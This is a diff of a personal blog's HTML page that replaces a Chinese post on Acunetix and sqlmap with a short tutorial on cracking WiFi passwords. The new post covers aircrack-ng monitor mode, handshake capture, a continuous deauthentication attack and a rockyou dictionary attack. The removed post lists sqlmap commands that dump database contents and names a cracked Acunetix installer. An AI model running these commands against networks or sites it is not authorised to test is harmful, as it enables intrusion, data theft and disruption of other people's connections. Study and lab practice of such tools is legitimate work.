@@ -4,20 +4,27 @@
   <meta charset="utf-8">
   
   
-  <title>awvs sqlmap | lzfblog</title>
+  <title>wifi破解 | lzfblog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="AWVS:安装包：acunetix_13.0.200217097_x64_with crack.zip启动： 1$ systemctl start acunetix.service">
+  <meta name="description" content="Enable the nic listening mode： 1# airmon-ng start wlan0">
 <meta property="og:type" content="article">
-<meta property="og:title" content="awvs sqlmap">
-<meta property="og:url" content="http://example.com/2022/04/20/awvs-sqlmap/index.html">
+<meta property="og:title" content="wifi破解">
+<meta property="og:url" content="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/index.html">
 <meta property="og:site_name" content="lzfblog">
-<meta property="og:description" content="AWVS:安装包：acunetix_13.0.200217097_x64_with crack.zip启动： 1$ systemctl start acunetix.service">
+<meta property="og:description" content="Enable the nic listening mode： 1# airmon-ng start wlan0">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-04-20T11:35:07.000Z">
-<meta property="article:modified_time" content="2022-04-20T11:51:00.491Z">
+<meta property="og:image" content="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi1.png">
+<meta property="og:image" content="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi2.png">
+<meta property="og:image" content="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/003.png">
+<meta property="og:image" content="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/004.png">
+<meta property="og:image" content="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi3.png">
+<meta property="og:image" content="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi4.png">
+<meta property="article:published_time" content="2022-04-20T11:53:24.000Z">
+<meta property="article:modified_time" content="2022-04-20T13:20:28.583Z">
 <meta property="article:author" content="Jone">
-<meta property="article:tag" content="kali">
+<meta property="article:tag" content="无线渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi1.png">
   
     <link rel="alternate" href="/atom.xml" title="lzfblog" type="application/atom+xml">
   
@@ -74,10 +81,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-awvs-sqlmap" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-wifi破解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/04/20/awvs-sqlmap/" class="article-date">
-  <time class="dt-published" datetime="2022-04-20T11:35:07.000Z" itemprop="datePublished">2022-04-20</time>
+    <a href="/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/" class="article-date">
+  <time class="dt-published" datetime="2022-04-20T11:53:24.000Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -88,7 +95,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      awvs sqlmap
+      wifi破解
     </h1>
   
 
@@ -96,29 +103,30 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>AWVS:<br>安装包：acunetix_13.0.200217097_x64_with crack.zip<br>启动：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl start acunetix.service</span><br></pre></td></tr></table></figure>
+        <p>Enable the nic listening mode：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airmon-ng start wlan0</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi1.png"></p>
 <span id="more"></span>
-<p>默认位置：<a target="_blank" rel="noopener" href="https://kali:3443/">https://kali:3443/</a></p>
-<p>sqlmap:<br>启动：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap 参数</span><br><span class="line">$ sqlmap -u url --xxxx</span><br></pre></td></tr></table></figure>
-<p>爆破数据库：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u url --dbs <span class="comment">#查看所有数据库名;</span></span><br><span class="line">$ sqlmap -u url --current-db <span class="comment">#查看当前所使用的数据库；</span></span><br></pre></td></tr></table></figure>
-<p>爆破数据库表：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u url -D 库名 -tables <span class="comment">#爆破数据库表名；</span></span><br><span class="line">                               <span class="comment"># -D：指定数据库名；</span></span><br><span class="line">                               <span class="comment"># -tables:查看指定数据库下所有表名；</span></span><br></pre></td></tr></table></figure>
-<p>爆破字段：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u url -D 库名 -T 表名  -columns <span class="comment"># 爆破字段名；</span></span><br><span class="line">                                        <span class="comment"># -T：指定表名；</span></span><br><span class="line">                                        <span class="comment"># -columns: 查看指定库表中所有字段；</span></span><br></pre></td></tr></table></figure>
-<p>爆破数据：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u url -D 库名 -T 表名 -C 字段名 -dump <span class="comment"># 爆破指定库表字段里面的所有数据；</span></span><br><span class="line">                                             <span class="comment"># -C:指定字段</span></span><br><span class="line">                                             <span class="comment">#-dump: 爆破字段数据；</span></span><br></pre></td></tr></table></figure>
+<p>scan wifi<br>command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airodump-ng wlan0mon</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi2.png"><br>Press Ctrl+C to stop the assignment.<br>PWR越小信号越强，Data越大使用人数越多；</p>
+<p>抓包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airodump-ng --bssid BSSID -c CH -w 抓包存储路径 wlan0mon</span></span><br></pre></td></tr></table></figure>
+<p>如:<br><img src="/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/003.png"><br><img src="/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/004.png"><br>打开一个新的终端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># aireplay-ng -0 0 -c STATION -a BSSID wlan0mon</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi3.png"><br><img src="/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/wifi4.png"><br>右上角出现WAP handsshake说明抓包成功；<br>解压kali自带字典文件  路径： &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt.gz</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gzip /usr/share/wordlist/rockyou.txt.gz</span></span><br></pre></td></tr></table></figure>
+<p>爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># aircrack-ng -w 字典路径   握手包路径</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/20/awvs-sqlmap/" data-id="cl27i1blt0000k4cp29ep9slj" data-title="awvs sqlmap" class="article-share-link">Teilen</a>
+      <a data-url="http://example.com/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/" data-id="cl27ltkz30000dgcphfbj81x1" data-title="wifi破解" class="article-share-link">Teilen</a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/" rel="tag">kali</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/" rel="tag">无线渗透</a></li></ul>
 
     </footer>
   </div>
@@ -126,19 +134,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2022/04/20/wifi%E7%A0%B4%E8%A7%A3/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Neuer</strong>
-      <div class="article-nav-title">
-        
-          wifi破解
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/04/12/linux%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E5%91%BD%E4%BB%A4/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2022/04/20/awvs-sqlmap/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Älter</strong>
-      <div class="article-nav-title">linux域名解析命令</div>
+      <div class="article-nav-title">awvs sqlmap</div>
     </a>
   
 </nav>
